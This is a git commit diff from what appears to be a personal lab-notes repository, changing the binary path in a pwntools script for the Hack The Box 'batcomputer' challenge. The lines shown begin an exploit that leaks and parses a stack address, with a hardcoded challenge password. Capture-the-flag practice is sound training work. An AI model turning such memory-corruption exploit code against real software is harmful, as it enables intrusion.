50309f82b1c41bbe756401aa44373678ddc906c3
Michel Klomp <michel@woodenshoe.org>
2021-02-14 17:26:12 +0100

    change path batcomputer

--- labnotes/htb/scripts/ch-batcomputer.py
+++ labnotes/htb/scripts/ch-batcomputer.py
@@ -3,7 +3,7 @@ from pwn import *
 
 password = 'b4tp@$$w0rd!'
 
-io = process('./batcomputer')
+io = process('~/Downloads/batcomputer')
 io.sendlineafter('> ', 1)
 stack_address = io.recvline().strip().split()[-1]
 stack_address = ''.join([chr(int(stack_address[i: i+2], 16)) for i in range(2, len(stack_address), 2)])
